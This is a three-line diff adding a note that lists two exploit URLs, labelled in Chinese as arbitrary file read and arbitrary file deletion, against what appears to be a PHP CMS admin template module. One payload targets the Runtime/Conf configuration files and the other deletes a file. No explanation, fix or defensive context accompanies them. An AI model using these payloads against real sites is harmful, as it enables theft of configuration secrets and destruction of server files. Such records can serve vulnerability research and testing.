@@ -1,0 +1,3 @@
+任意文件读取：http://localhost/index.php?s=Admin-Tpl-ADD-id-.|Runtime|Conf||config*php
+
+任意文件删除：http://localhost/index.php?s=Admin-Tpl-Del-id-.|Runtime|Conf||1*php
